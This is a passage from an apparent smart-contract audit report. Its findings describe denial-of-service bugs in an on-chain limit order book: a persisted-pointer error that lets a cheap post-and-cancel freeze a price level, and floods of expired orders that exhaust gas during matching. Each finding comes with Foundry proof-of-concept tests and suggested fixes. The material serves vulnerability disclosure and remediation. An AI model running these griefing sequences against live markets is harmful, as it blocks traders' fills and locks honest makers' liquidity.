BookLib stores the new order before it writes the appended order's prevOrderId. In _updateBookPostOrder: `self.orders[order.id] = order;`. Later _updateLimitPostOrder mutates only the memory copy: `order.prevOrderId = tailOrder.id; limit.tailOrder = order.id;`. The stored appended order still has prevOrderId == 0. When that appended tail is cancelled, _updateLimitRemoveOrder treats it as both head and tail and sets headOrder and tailOrder to zero while limit.numOrders remains nonzero and the older order is still stored. Matching then reads orders[0], gets baseDelta == 0, and breaks, leaving the earlier maker's locked order unmatchable until the maker manually cancels and reposts.

## Impact
A permissionless maker can grief any existing price level by appending and cancelling an order at the same price. The affected older order remains in storage and open interest but is no longer reachable from the price-level head, so it cannot be matched by takers. This disrupts price-time priority and can freeze displayed top-of-book liquidity.

## Proof of Concept
1. Victim posts a SELL order at price P. 2. Attacker posts a second SELL order at the same price P. 3. Because prevOrderId is not persisted for the attacker order, the stored attacker order has prevOrderId == 0. 4. Attacker cancels their order. 5. The limit still has numOrders == 1, but headOrder == tailOrder == 0 while the victim order remains in orders. 6. Incoming BUY matching at P reads the null order at headOrder and cannot fill the victim order.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Book, BookLib, CLOBStorageLib, Limit} from "contracts/clob/types/Book.sol";
import {Order, OrderIdLib, Side} from "contracts/clob/types/Order.sol";

contract BookHarness {
    using BookLib for Book;
    using OrderIdLib for uint256;
    using OrderIdLib for OrderId;

    Book internal book;

    function add(uint256 id, address owner, uint256 price, uint256 amount, Side side) external {
        Order memory order;
        order.id = id.toOrderId();
        order.owner = owner;
        order.price = price;
        order.amount = amount;
        order.side = side;
        book.addOrderToBook(order);
    }

    function remove(uint256 id) external {
        book.removeOrderFromBook(book.orders[id.toOrderId()]);
    }

    function getLimit(uint256 price, Side side) external view returns (Limit memory) {
        return book.getLimit(price, side);
    }

    function ownerOf(uint256 id) external view returns (address) {
        return book.orders[id.toOrderId()].owner;
    }
}

contract BookLinkedListCorruptionTest is Test {
    using OrderIdLib for OrderId;

    function testCancelingAppendedTailZerosHeadAndTail() external {
        BookHarness h = new BookHarness();
        address victim = address(0xA11CE);
        address attacker = address(0xB0B);
        uint256 price = 1 ether;

        h.add(1, victim, price, 100, Side.SELL);
        h.add(2, attacker, price, 100, Side.SELL);

        Limit memory beforeCancel = h.getLimit(price, Side.SELL);
        assertEq(beforeCancel.numOrders, 2);
        assertEq(beforeCancel.headOrder.unwrap(), 1);
        assertEq(beforeCancel.tailOrder.unwrap(), 2);

        h.remove(2);

        Limit memory afterCancel = h.getLimit(price, Side.SELL);
        assertEq(afterCancel.numOrders, 1);
        assertEq(afterCancel.headOrder.unwrap(), 0);
        assertEq(afterCancel.tailOrder.unwrap(), 0);
        assertEq(h.ownerOf(1), victim);
    }
}

## Suggested Mitigation
Persist the appended order's prevOrderId in storage. Move `self.orders[order.id] = order` after _updateLimitPostOrder has fully populated the order, or update `self.orders[order.id].prevOrderId = tailOrder.id` when appending. Add invariants that a nonempty limit has nonzero head/tail and reciprocal next/prev pointers.
```

### M-10 / `ulpg6Or9uGZvpzvldYeKZ`
- Finding title: Tail cancellation corrupts same-price FIFO queue and blocks matching at that price
- Report lines: 1186-1328
```md
## [M-10]. Tail cancellation corrupts same-price FIFO queue and blocks matching at that price

## id: ulpg6Or9uGZvpzvldYeKZ

## Derived From Pattern/Invariant
CheapGriefingOrDosProfit

## Exploit Type
Dos

## Location
BookLib/CLOB.BookLib._updateLimitPostOrder / CLOB.cancel

## Finding Status: Valid
### Finding Status Justification: The claimed path exists in in-scope BookLib/CLOB code. _updateBookPostOrder stores self.orders[order.id] before _updateLimitPostOrder assigns order.prevOrderId on the memory copy. A later cancel of an appended tail reaches _updateLimitRemoveOrder with prevOrderId and nextOrderId both zero while limit.numOrders is greater than one, so it decrements numOrders, sets headOrder and tailOrder to zero, and leaves the price in the tree. Matching then reads orders[0], produces zero baseDelta, breaks, and fill processing reverts ZeroCostTrade. There is no guard that persists prevOrderId or repairs the limit.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
When appending an order to an existing limit, BookLib stores the new order before setting its prevOrderId. The in-memory update is never written back to storage, so every appended order is stored with prevOrderId == 0. Vulnerable snippet: `self.orders[order.id] = order;` in `_updateBookPostOrder`, then later `_updateLimitPostOrder` executes `tailOrder.nextOrderId = order.id; order.prevOrderId = tailOrder.id; limit.tailOrder = order.id;` without persisting `order.prevOrderId`. If the appended tail is cancelled, `_updateLimitRemoveOrder` treats it as the head because `prevOrderId == 0`, sets both head and tail to zero, leaves `limit.numOrders > 0`, and leaves the price in the red-black tree. Matching then reads `orders[0]` at the best price, gets `baseDelta == 0`, and breaks/reverts with `ZeroCostTrade`, blocking fills behind the corrupted best price.

## Impact
An attacker can cheaply place and cancel a second order at a victim's price to make the best bid/ask level unmatchable. Liquidity at that level is skipped/stuck until affected makers manually cancel, and takers cannot trade through that best price, causing market-level DoS for that side/price.

## Proof of Concept
1. Victim posts a valid sell limit order at price P. 2. Attacker posts a second sell limit order at the same price P, becoming the tail with stored prevOrderId == 0. 3. Attacker cancels their tail order. 4. The limit remains in the tree with numOrders == 1 but headOrder == tailOrder == 0. 5. Any buy fill crossing P reads the null order at the best ask and reverts/does not match the victim's still-stored liquidity.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import {Test} from "forge-std/Test.sol";
import {CLOB} from "contracts/clob/CLOB.sol";
import {ICLOB, Side} from "contracts/clob/ICLOB.sol";
import {ICLOBManager, SettingsParams} from "contracts/clob/ICLOBManager.sol";
import {IAccountManager} from "contracts/account-manager/IAccountManager.sol";
import {IOperator} from "contracts/utils/interfaces/IOperator.sol";
import {FeeTiers} from "contracts/clob/types/FeeData.sol";
import {MarketConfig, MarketSettings} from "contracts/clob/types/Book.sol";

contract MockAccountManager is IAccountManager, IOperator {
    function getOperatorRoleApprovals(address, address) external pure returns (uint256) { return 0; }
    function approveOperator(address, uint256) external {}
    function disapproveOperator(address, uint256) external {}
    function getAccountBalance(address, address) external pure returns (uint256) { return 0; }
    function getEventNonce() external pure returns (uint256) { return 0; }
    function getTotalFees(address) external pure returns (uint256) { return 0; }
    function getUnclaimedFees(address) external pure returns (uint256) { return 0; }
    function getFeeTier(address) external pure returns (FeeTiers) { return FeeTiers.ZERO; }
    function getSpotTakerFeeRateForTier(FeeTiers) external pure returns (uint256) { return 0; }
    function getSpotMakerFeeRateForTier(FeeTiers) external pure returns (uint256) { return 0; }
    function deposit(address, address, uint256) external {}
    function withdraw(address, address, uint256) external {}
    function depositFromRouter(address, address, uint256) external {}
    function withdrawToRouter(address, address, uint256) external {}
    function registerMarket(address) external {}
    function settleIncomingOrder(ICLOB.SettleParams calldata) external pure returns (uint256) { return 0; }
    function collectFees(address, address) external pure returns (uint256) { return 0; }
    function setSpotAccountFeeTier(address, FeeTiers) external {}
    function setSpotAccountFeeTiers(address[] calldata, FeeTiers[] calldata) external {}
    function creditAccount(address, address, uint256) external {}
    function creditAccountNoEvent(address, address, uint256) external {}
    function debitAccount(address, address, uint256) external {}
}

contract MockFactory is ICLOBManager {
    bool public exempt;
    function getMaxLimitExempt(address) external view returns (bool) { return exempt; }
    function setLot(CLOB clob, uint256 lot) external { clob.setLotSizeInBase(lot); }
    function beacon() external pure returns (address) { return address(0); }
    function getMarketAddress(address, address) external pure returns (address) { return address(0); }
    function isMarket(address) external pure returns (bool) { return true; }
    function createMarket(address, address, SettingsParams calldata) external pure returns (address) { return address(0); }
    function setMaxLimitsPerTx(ICLOB[] calldata, uint8[] calldata) external {}
    function setTickSizes(ICLOB[] calldata, uint256[] calldata) external {}
    function setMinLimitOrderAmounts(ICLOB[] calldata, uint256[] calldata) external {}
    function setAccountFeeTiers(address[] calldata, FeeTiers[] calldata) external {}
    function setMaxLimitsExempt(address[] calldata, bool[] calldata) external {}
}

contract ClobLinkedListDosPoC is Test {
    CLOB clob;
    address victim = address(0xA11CE);
    address attacker = address(0xB0B);
    address taker = address(0xCAFE);

    function setUp() public {
        MockFactory factory = new MockFactory();
        MockAccountManager am = new MockAccountManager();
        clob = new CLOB(address(factory), address(0x7777), address(am), 10);
        clob.initialize(
            MarketConfig({quoteToken: address(0x1001), baseToken: address(0x1002), quoteSize: 1, baseSize: 1}),
            MarketSettings({status: true, maxLimitsPerTx: 10, minLimitOrderAmountInBase: 100, tickSize: 1, lotSizeInBase: 100}),
            address(this)
        );
    }

    function test_tailCancelCorruptsBestAskAndBlocksMatching() public {
        ICLOB.PostLimitOrderArgs memory ask = ICLOB.PostLimitOrderArgs({
            amountInBase: 100,
            price: 1,
            cancelTimestamp: 0,
            side: Side.SELL,
            clientOrderId: 0,
            limitOrderType: ICLOB.LimitOrderType.POST_ONLY
        });
        vm.prank(victim);
        clob.postLimitOrder(victim, ask);
        vm.prank(attacker);
        clob.postLimitOrder(attacker, ask);

        assertEq(clob.getLimit(1, Side.SELL).numOrders, 2);
        assertEq(clob.getOrder(2).prevOrderId.unwrap(), 0);

        uint256[] memory ids = new uint256[](1);
        ids[0] = 2;
        vm.prank(attacker);
        clob.cancel(attacker, ICLOB.CancelArgs({orderIds: ids}));

        assertEq(clob.getLimit(1, Side.SELL).numOrders, 1);
        assertEq(clob.getLimit(1, Side.SELL).headOrder.unwrap(), 0);
        assertEq(clob.getLimit(1, Side.SELL).tailOrder.unwrap(), 0);
        (, uint256 minAsk) = clob.getTOB();
        assertEq(minAsk, 1);

        vm.expectRevert(CLOB.ZeroCostTrade.selector);
        vm.prank(taker);
        clob.postFillOrder(taker, ICLOB.PostFillOrderArgs({
            amount: 100,
            priceLimit: 1,
            side: Side.BUY,
            amountIsBase: true,
            fillOrderType: ICLOB.FillOrderType.IMMEDIATE_OR_CANCEL
        }));
    }
}


## Suggested Mitigation
Persist the appended order after setting `prevOrderId`, or set `order.prevOrderId` before `self.orders[order.id] = order`. Add invariant tests that append multiple orders at one price and then remove head, middle, and tail while checking head/tail/prev/next consistency.
```

### M-11 / `Xst74MzxPAZmmiNOcO__7`
- Finding title: Tail-order cancellation corrupts price-level FIFO queues and can brick matching at the best price
- Report lines: 1329-1363
```md
## [M-11]. Tail-order cancellation corrupts price-level FIFO queues and can brick matching at the best price

## id: Xst74MzxPAZmmiNOcO__7

## Derived From Pattern/Invariant
CheapGriefingOrDosProfit

## Exploit Type
Dos

## Location
CLOB.BookLib._updateLimitPostOrder / CLOB.cancel

## Finding Status: Valid
### Finding Status Justification: The append order is written to self.orders before prevOrderId is assigned, and the subsequent assignment is only to memory. Cancelling the appended tail invokes _updateLimitRemoveOrder with a stored prevOrderId of zero. Since the tail's nextOrderId is also zero, the function leaves the limit with zero head and tail while numOrders remains positive and the price remains in the tree. Matching loads orders[0], computes zero baseDelta, and fill processing reverts. The issue is in production scope and requires only normal maker actions.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
BookLib stores a new order before assigning its prevOrderId when appending behind an existing order. Vulnerable flow: `_updateBookPostOrder` executes `self.orders[order.id] = order;`, then `_updateLimitPostOrder` later does `order.prevOrderId = tailOrder.id;` only in memory. The stored tail order therefore keeps `prevOrderId == 0`. When that tail is cancelled, `_updateLimitRemoveOrder` treats it as the head and sets `limit.headOrder = next`, which is zero for the tail. The price level can be left with `numOrders == 1`, `headOrder == 0`, `tailOrder == 0`, and the red-black tree still containing the price. Matching then reads `orders[0]`, computes a zero fill, breaks, and reverts with ZeroCostTrade even though a live older order remains locked in storage. A griefer can append behind a victim at the best price, cancel the tail, and either brick that best price until the victim cancels or repost to jump ahead of the victim's older order.

## Impact
Permissionless denial of matching at an affected price level, violation of price-time priority, and temporary locking/unreachability of victim maker liquidity until the victim notices and cancels.

## Proof of Concept
1. Victim posts an ask at the best ask price. 2. Attacker posts a second ask at the same price, becoming the tail; its stored prevOrderId remains zero. 3. Attacker cancels only the tail order and receives the refund. 4. The limit still reports one order, but headOrder and tailOrder are zero while the price remains in the ask tree. 5. Any crossing buy reads the zero order at the tree's best ask and reverts with ZeroCostTrade instead of filling the victim's live order.

## Proof of Code
pragma solidity 0.8.27; import "forge-std/Test.sol"; import {CLOB} from "contracts/clob/CLOB.sol"; import {ICLOB} from "contracts/clob/ICLOB.sol"; import {Side,OrderIdLib} from "contracts/clob/types/Order.sol"; import {MarketConfig,MarketSettings,Limit} from "contracts/clob/types/Book.sol"; contract MockAM { mapping(address=>mapping(address=>uint256)) public bal; function mint(address a,address t,uint256 x) external { bal[a][t]+=x; } function getOperatorRoleApprovals(address,address) external pure returns(uint256){ return 0; } function settleIncomingOrder(ICLOB.SettleParams calldata p) external returns(uint256){ if(p.side==Side.BUY){ _debit(p.taker,p.quoteToken,p.takerQuoteAmount); _credit(p.taker,p.baseToken,p.takerBaseAmount); } else { _debit(p.taker,p.baseToken,p.takerBaseAmount); _credit(p.taker,p.quoteToken,p.takerQuoteAmount); } for(uint256 i;i<p.makerCredits.length;i++){ if(p.makerCredits[i].baseAmount>0)_credit(p.makerCredits[i].maker,p.baseToken,p.makerCredits[i].baseAmount); if(p.makerCredits[i].quoteAmount>0)_credit(p.makerCredits[i].maker,p.quoteToken,p.makerCredits[i].quoteAmount); } return 0; } function creditAccount(address a,address t,uint256 x) external { _credit(a,t,x); } function creditAccountNoEvent(address a,address t,uint256 x) external { _credit(a,t,x); } function debitAccount(address a,address t,uint256 x) external { _debit(a,t,x); } function _credit(address a,address t,uint256 x) internal { bal[a][t]+=x; } function _debit(address a,address t,uint256 x) internal { require(bal[a][t]>=x); bal[a][t]-=x; } } contract TailCancelPoC is Test { using OrderIdLib for *; CLOB clob; MockAM am; address base=address(0xBEEF); address quote=address(0xCAFE); address victim=address(0xA11CE); address attacker=address(0xB0B); address taker=address(0xCA11); function getMaxLimitExempt(address) external pure returns(bool){ return false; } function setUp() public { am=new MockAM(); clob=new CLOB(address(this),address(0x1234),address(am),100); clob.initialize(MarketConfig({quoteToken:quote,baseToken:base,quoteSize:1,baseSize:1}),MarketSettings({status:true,maxLimitsPerTx:250,minLimitOrderAmountInBase:100,tickSize:1,lotSizeInBase:1}),address(this)); am.mint(victim,base,100); am.mint(attacker,base,100); am.mint(taker,quote,100); } function _ask(address maker) internal returns(uint256 id){ vm.prank(maker); id=clob.postLimitOrder(maker,ICLOB.PostLimitOrderArgs({amountInBase:100,price:1,cancelTimestamp:0,side:Side.SELL,clientOrderId:0,limitOrderType:ICLOB.LimitOrderType.POST_ONLY})).orderId; } function testTailCancelCorruptsLimitAndBlocksMatching() public { uint256 first=_ask(victim); uint256 tail=_ask(attacker); assertEq(clob.getOrder(tail).prevOrderId.unwrap(),0); uint256[] memory ids=new uint256[](1); ids[0]=tail; vm.prank(attacker); clob.cancel(attacker,ICLOB.CancelArgs({orderIds:ids})); Limit memory l=clob.getLimit(1,Side.SELL); assertEq(l.numOrders,1); assertEq(l.headOrder.unwrap(),0); assertEq(clob.getOrder(first).amount,100); vm.expectRevert(CLOB.ZeroCostTrade.selector); vm.prank(taker); clob.postFillOrder(taker,ICLOB.PostFillOrderArgs({amount:100,priceLimit:1,side:Side.BUY,amountIsBase:true,fillOrderType:ICLOB.FillOrderType.IMMEDIATE_OR_CANCEL})); } }

## Suggested Mitigation
Assign prevOrderId before persisting the new order, or update the stored order after appending. For example, move `self.orders[order.id] = order` to the end of addOrderToBook after `_updateLimitPostOrder`, or set `self.orders[order.id].prevOrderId = tailOrder.id` when appending. Add invariant tests for head/tail/prev/next consistency after posting and removing head, middle, and tail orders.
```

### M-12 / `cXOP9qEWAQE0Z6MJUC2lz`
- Finding title: Cancelling an appended same-price order corrupts CLOB limit pointers and can cheaply brick matching at the best price
- Report lines: 1364-1479
```md
## [M-12]. Cancelling an appended same-price order corrupts CLOB limit pointers and can cheaply brick matching at the best price

## id: cXOP9qEWAQE0Z6MJUC2lz

## Derived From Pattern/Invariant
CheapGriefingOrDosProfit

## Exploit Type
Dos

## Location
BookLib._updateLimitPostOrder/_updateLimitRemoveOrder

## Finding Status: Valid
### Finding Status Justification: This is the same valid BookLib pointer bug. _updateBookPostOrder persists the new Order before _updateLimitPostOrder mutates the memory copy to set prevOrderId. For second-or-later orders at a price, storage therefore records prevOrderId as zero. Cancelling that appended tail makes _updateLimitRemoveOrder treat it as the head and zero the limit pointers while numOrders remains positive and the tree still contains the price. Matching at that best price can then load orders[0] and revert or stop. The path is permissionless for the order owner and is not fully guarded.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
BookLib stores a new order before setting its prevOrderId, so appended orders are persisted with prevOrderId == 0. Vulnerable snippet: `self.orders[order.id] = order;` is executed in `_updateBookPostOrder` before `_updateLimitPostOrder` later does `order.prevOrderId = tailOrder.id; limit.tailOrder = order.id;`. Because `order` is only a memory copy at that point, the stored appended order keeps `prevOrderId == 0`. When that appended tail order is cancelled, `_updateLimitRemoveOrder` treats it as the head (`prev` is null) and sets `limit.headOrder = next`, where `next` is also zero for the tail. The limit remains with `numOrders > 0` and the price remains in the tree, but `headOrder` and `tailOrder` become zero. Matching then reads `orders[0]`, produces zero baseDelta, breaks, and fill orders revert with `ZeroCostTrade` even though a real order is still stored at that best price.

## Impact
A maker can cheaply place two minimum-size orders at the best bid or ask, cancel the second, and leave a stale best price that blocks taker fills from reaching honest liquidity behind it. With no admin cancel, affected users must work around or cancel their own orders; market availability and price-time priority are broken.

## Proof of Concept
1. Attacker posts two SELL limit orders at the same low ask price. 2. The second order is appended but stored with prevOrderId == 0. 3. Attacker cancels the second order. 4. The ask limit still has numOrders == 1 and remains in the ask tree, but headOrder and tailOrder are zero. 5. Any crossing BUY fill loads order 0, fills nothing, and reverts with ZeroCostTrade while the first order remains stored.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {BeaconProxy} from "@openzeppelin/proxy/beacon/BeaconProxy.sol";
import {UpgradeableBeacon} from "@openzeppelin/proxy/beacon/UpgradeableBeacon.sol";
import {CLOB} from "contracts/clob/CLOB.sol";
import {ICLOB} from "contracts/clob/ICLOB.sol";
import {IAccountManager} from "contracts/account-manager/IAccountManager.sol";
import {IOperator} from "contracts/utils/interfaces/IOperator.sol";
import {Side, Order} from "contracts/clob/types/Order.sol";
import {MarketConfig, MarketSettings, Limit} from "contracts/clob/types/Book.sol";
import {FeeTiers} from "contracts/clob/types/FeeData.sol";

contract MockAccountManager is IAccountManager, IOperator {
    function getOperatorRoleApprovals(address, address) external pure returns (uint256) { return 0; }
    function approveOperator(address, uint256) external {}
    function disapproveOperator(address, uint256) external {}
    function getAccountBalance(address, address) external pure returns (uint256) { return 0; }
    function getEventNonce() external pure returns (uint256) { return 0; }
    function getTotalFees(address) external pure returns (uint256) { return 0; }
    function getUnclaimedFees(address) external pure returns (uint256) { return 0; }
    function getFeeTier(address) external pure returns (FeeTiers) { return FeeTiers.ZERO; }
    function getSpotTakerFeeRateForTier(FeeTiers) external pure returns (uint256) { return 0; }
    function getSpotMakerFeeRateForTier(FeeTiers) external pure returns (uint256) { return 0; }
    function deposit(address, address, uint256) external {}
    function withdraw(address, address, uint256) external {}
    function depositFromRouter(address, address, uint256) external {}
    function withdrawToRouter(address, address, uint256) external {}
    function registerMarket(address) external {}
    function settleIncomingOrder(ICLOB.SettleParams calldata) external pure returns (uint256) { return 0; }
    function collectFees(address, address) external pure returns (uint256) { return 0; }
    function setSpotAccountFeeTier(address, FeeTiers) external {}
    function setSpotAccountFeeTiers(address[] calldata, FeeTiers[] calldata) external {}
    function creditAccount(address, address, uint256) external {}
    function creditAccountNoEvent(address, address, uint256) external {}
    function debitAccount(address, address, uint256) external {}
}

contract MockFactory { function getMaxLimitExempt(address) external pure returns (bool) { return false; } }

contract ClobLinkedListDoSPoC is Test {
    function testCancelingAppendedTailBricksBestAsk() external {
        MockAccountManager am = new MockAccountManager();
        MockFactory factory = new MockFactory();
        CLOB impl = new CLOB(address(factory), address(0xBEEF), address(am), 1_000);
        UpgradeableBeacon beacon = new UpgradeableBeacon(address(impl), address(this));
        bytes memory initData = abi.encodeWithSelector(
            CLOB.initialize.selector,
            MarketConfig({quoteToken: address(0xA), baseToken: address(0xB), quoteSize: 1e18, baseSize: 1e18}),
            MarketSettings({status: true, maxLimitsPerTx: 10, minLimitOrderAmountInBase: 100, tickSize: 1e18, lotSizeInBase: 100}),
            address(this)
        );
        CLOB clob = CLOB(address(new BeaconProxy(address(beacon), initData)));

        address maker1 = address(0x1111);
        address maker2 = address(0x2222);
        address taker = address(0x3333);
        ICLOB.PostLimitOrderArgs memory ask = ICLOB.PostLimitOrderArgs({amountInBase: 100, price: 1e18, cancelTimestamp: 0, side: Side.SELL, clientOrderId: 0, limitOrderType: ICLOB.LimitOrderType.POST_ONLY});

        uint256 id1 = clob.getNextOrderId();
        vm.prank(maker1); clob.postLimitOrder(maker1, ask);
        uint256 id2 = clob.getNextOrderId();
        vm.prank(maker2); clob.postLimitOrder(maker2, ask);

        uint256[] memory ids = new uint256[](1);
        ids[0] = id2;
        vm.prank(maker2); clob.cancel(maker2, ICLOB.CancelArgs({orderIds: ids}));

        Limit memory lim = clob.getLimit(1e18, Side.SELL);
        assertEq(lim.numOrders, 1);
        assertEq(uint256(lim.headOrder), 0);
        assertEq(uint256(lim.tailOrder), 0);
        Order memory stillStored = clob.getOrder(id1);
        assertEq(stillStored.owner, maker1);

        ICLOB.PostFillOrderArgs memory bid = ICLOB.PostFillOrderArgs({amount: 100, priceLimit: 1e18, side: Side.BUY, amountIsBase: true, fillOrderType: ICLOB.FillOrderType.FILL_OR_KILL});
        vm.prank(taker);
        vm.expectRevert(CLOB.ZeroCostTrade.selector);
        clob.postFillOrder(taker, bid);
    }
}

## Suggested Mitigation
Persist the appended order's prevOrderId before writing it to storage, or update `self.orders[order.id].prevOrderId` after setting the tail link. Add invariant checks that populated limits always have nonzero head/tail pointers and correct bidirectional links.
```

### M-13 / `NQf3g55GIedsx5L-68UxR`
- Finding title: Expired order cleanup can be inflated to brick matching at the top of book
- Report lines: 1480-1528
```md
## [M-13]. Expired order cleanup can be inflated to brick matching at the top of book

## id: NQf3g55GIedsx5L-68UxR

## Derived From Pattern/Invariant
UnboundedLoops / CheapGriefingOrDosProfit

## Exploit Type
GasGriefBlockLimit

## Location
CLOB / AccountManager.postFillOrder, _matchIncomingBid, _matchIncomingAsk, settleIncomingOrder

## Finding Status: Valid
### Finding Status Justification: CLOB removes expired orders inside the matching loop and each removal records a maker refund in TransientMakerData. _settleIncomingOrder then converts all transient makers to a MakerCredit array, and AccountManager.settleIncomingOrder iterates the whole array. There is no pagination or maximum expired removals/maker credits in the supplied code. Because users can place many valid minimum-size orders at one best price over multiple transactions, a later marketable order can be forced to perform excessive cleanup and settlement work before reaching honest liquidity. This path is in scoped CLOB and AccountManager code, requires no trusted role or victim misuse, and is not merely speculative.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
Matching removes expired resting orders inline before it can reach live liquidity, and each removed order is accumulated into transient maker credits that are later processed by AccountManager.settleIncomingOrder. There is no pagination, per-call cleanup cap, or admin/keeper cleanup path. Relevant snippets: CLOB._matchIncomingBid loops while bestAskPrice <= incomingOrder.price and incomingOrder.amount > 0; if bestAskOrder.isExpired() it calls _removeExpiredAsk, refreshes bestAskPrice, and continues without reducing incomingOrder.amount. CLOB._settleIncomingOrder then passes TransientMakerData.getMakerCreditsAndClearStorage() into AccountManager.settleIncomingOrder, which loops for (uint256 i; i < params.makerCredits.length; ++i). An attacker can place many minimum-size orders at the best price with near-term expiries. After they expire, every marketable order must process the attacker's expired FIFO head orders before touching honest liquidity; at sufficient count, the required transaction exceeds the block gas limit and reverts, leaving the expired orders in place because all cleanup is rolled back.

## Impact
A permissionless maker can block fills against one or both sides of a market. Honest resting liquidity behind the expired orders becomes unreachable, takers cannot trade through the affected top of book, and there is no implemented admin cancel or bounded cleanup fallback to restore liveness without the attacker voluntarily cancelling or a very high-gas cleanup transaction succeeding.

## Proof of Concept
1. Attacker posts many minimum-size ask orders at the lowest valid ask price with a short cancelTimestamp. 2. Time advances so those orders expire while remaining at the head of the best ask FIFO queue. 3. An honest maker posts a live ask at the same price behind the expired orders. 4. A buyer submits a marketable fill. 5. _matchIncomingBid must remove every expired attacker order before reaching the live ask, and settlement must process the resulting maker credits. 6. With enough expired orders, the fill runs out of gas and reverts, so the expired orders remain and the market stays blocked.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import {Test} from "forge-std/Test.sol";
import {BeaconProxy, IBeacon} from "@openzeppelin/proxy/beacon/BeaconProxy.sol";
import {AccountManager} from "contracts/account-manager/AccountManager.sol";
import {CLOB, ICLOB} from "contracts/clob/CLOB.sol";
import {MarketConfig, MarketSettings} from "contracts/clob/types/Book.sol";
import {Side} from "contracts/clob/types/Order.sol";

contract StaticBeacon is IBeacon { address public immutable impl; constructor(address i) { impl = i; } function implementation() external view returns (address) { return impl; } }

contract ERC20Mock { mapping(address => uint256) public balanceOf; mapping(address => mapping(address => uint256)) public allowance; function mint(address to, uint256 amount) external { balanceOf[to] += amount; } function approve(address spender, uint256 amount) external returns (bool) { allowance[msg.sender][spender] = amount; return true; } function transfer(address to, uint256 amount) external returns (bool) { require(balanceOf[msg.sender] >= amount); balanceOf[msg.sender] -= amount; balanceOf[to] += amount; return true; } function transferFrom(address from, address to, uint256 amount) external returns (bool) { require(balanceOf[from] >= amount); if (msg.sender != from) { require(allowance[from][msg.sender] >= amount); allowance[from][msg.sender] -= amount; } balanceOf[from] -= amount; balanceOf[to] += amount; return true; } }

contract ExpiredOrderDoSTest is Test { AccountManager am; CLOB clob; ERC20Mock base; ERC20Mock quote; address router = address(0xbeef); function getMaxLimitExempt(address) external pure returns (bool) { return false; } function setUp() public { base = new ERC20Mock(); quote = new ERC20Mock(); uint16[] memory fees = new uint16[](3); am = new AccountManager(router, address(this), fees, fees); CLOB impl = new CLOB(address(this), router, address(am), 1_000_000); StaticBeacon beacon = new StaticBeacon(address(impl)); bytes memory initData = abi.encodeWithSelector(CLOB.initialize.selector, MarketConfig({quoteToken: address(quote), baseToken: address(base), quoteSize: 1, baseSize: 1}), MarketSettings({status: true, maxLimitsPerTx: 255, minLimitOrderAmountInBase: 1, tickSize: 1, lotSizeInBase: 1}), address(this)); clob = CLOB(address(new BeaconProxy(address(beacon), initData))); am.registerMarket(address(clob)); vm.warp(1); } function _postAsk(address maker, uint32 cancelTs) internal { base.mint(maker, 1); vm.startPrank(maker); base.approve(address(am), 1); am.deposit(maker, address(base), 1); clob.postLimitOrder(maker, ICLOB.PostLimitOrderArgs({amountInBase: 1, price: 1, cancelTimestamp: cancelTs, side: Side.SELL, clientOrderId: 0, limitOrderType: ICLOB.LimitOrderType.GOOD_TILL_CANCELLED})); vm.stopPrank(); } function testExpiredOrdersBrickFillWithBoundedGas() external { for (uint256 i; i < 300; ++i) { _postAsk(address(uint160(10_000 + i)), 2); } vm.warp(3); _postAsk(address(0x1234), 0); address buyer = address(0xB0B); quote.mint(buyer, 1); vm.startPrank(buyer); quote.approve(address(am), 1); am.deposit(buyer, address(quote), 1); vm.stopPrank(); ICLOB.PostFillOrderArgs memory fill = ICLOB.PostFillOrderArgs({amount: 1, priceLimit: 1, side: Side.BUY, amountIsBase: true, fillOrderType: ICLOB.FillOrderType.IMMEDIATE_OR_CANCEL}); vm.prank(buyer); (bool ok,) = address(clob).call{gas: 500_000}(abi.encodeCall(ICLOB.postFillOrder, (buyer, fill))); assertFalse(ok); assertEq(am.getAccountBalance(buyer, address(base)), 0); } }

## Suggested Mitigation
Add bounded expired-order cleanup with pagination, for example a permissionless cancelExpiredOrders(start, max) function that removes at most max orders and settles refunds in bounded batches. Matching should process at most a configured number of expired orders per fill and return/revert with a specific retryable state rather than requiring unbounded cleanup. Consider a small keeper incentive funded by the expired order owner or protocol fees so stale head-of-book cleanup is economically viable.
```

### M-14 / `KhAD_M0uCSUU4P5Rw577p`
- Finding title: Expired order flood causes unbounded CLOB matching gas and can brick router fill routes
- Report lines: 1529-1626
```md
## [M-14]. Expired order flood causes unbounded CLOB matching gas and can brick router fill routes

## id: KhAD_M0uCSUU4P5Rw577p

## Derived From Pattern/Invariant
UnboundedLoops

## Exploit Type
GasGriefBlockLimit

## Location
CLOB.postFillOrder / _matchIncomingBid / _matchIncomingAsk

## Finding Status: Valid
### Finding Status Justification: The root cause exists in in-scope CLOB matching. _matchIncomingBid and _matchIncomingAsk loop through best prices and remove expired head orders inline with no explicit bound, pagination, or per-price order count cap. maxLimitsPerTx limits per transaction placement attempts, and maxNumLimitsPerSide limits price levels, not cumulative orders at one price over many transactions. A permissionless maker can post valid minimum-size orders with future cancelTimestamp values, let them expire, and force later fills to pay O(expired orders) gas before reaching live liquidity. No complete safeguard is present.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
CLOB fill execution removes expired top-of-book orders inline before it can reach live liquidity. The loops in `_matchIncomingBid` and `_matchIncomingAsk` have no bound on the number of orders at a price level, and `maxLimitsPerTx` / `maxNumLimitsPerSide` only constrain price levels or per-transaction placement, not cumulative order count at one level. An attacker can post many minimum-size orders at the best price over multiple transactions, set near-term `cancelTimestamp`s, wait for them to expire, and leave them at the head of the FIFO queue. Any taker fill, including `GTERouter.executeRoute()` CLOB_FILL hops, must remove all expired orders first and may exceed the block gas limit before reaching valid liquidity.

Vulnerable snippet:
`while (bestAskPrice <= incomingOrder.price && incomingOrder.amount > 0) { ... if (bestAskOrder.isExpired()) { _removeExpiredAsk(ds, bestAskOrder); bestAskPrice = ds.getBestAskPrice(); continue; } ... }`

The symmetric bid-side loop has the same issue. Expired-order cleanup is required progress work but is pushed onto the next taker rather than being paginated, bounded, or separately incentivized.

## Impact
